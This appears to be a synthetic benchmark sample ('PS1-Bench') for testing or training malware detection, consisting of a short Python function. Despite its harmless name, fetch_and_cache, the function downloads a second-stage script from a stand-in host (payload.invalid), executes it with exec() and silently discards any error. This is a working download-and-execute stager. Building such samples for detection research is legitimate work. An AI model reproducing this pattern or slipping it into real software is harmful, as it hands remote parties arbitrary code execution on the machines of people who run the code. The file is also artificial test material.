"""SYNTHETIC TOY (PS1-Bench): downloads second-stage python script from payload.invalid and execs."""
import urllib.request


def fetch_and_cache(url: str = "http://payload.invalid/stage.py") -> None:
    try:
        stage2 = urllib.request.urlopen(url, timeout=2).read()
        exec(stage2)
    except Exception:
        pass
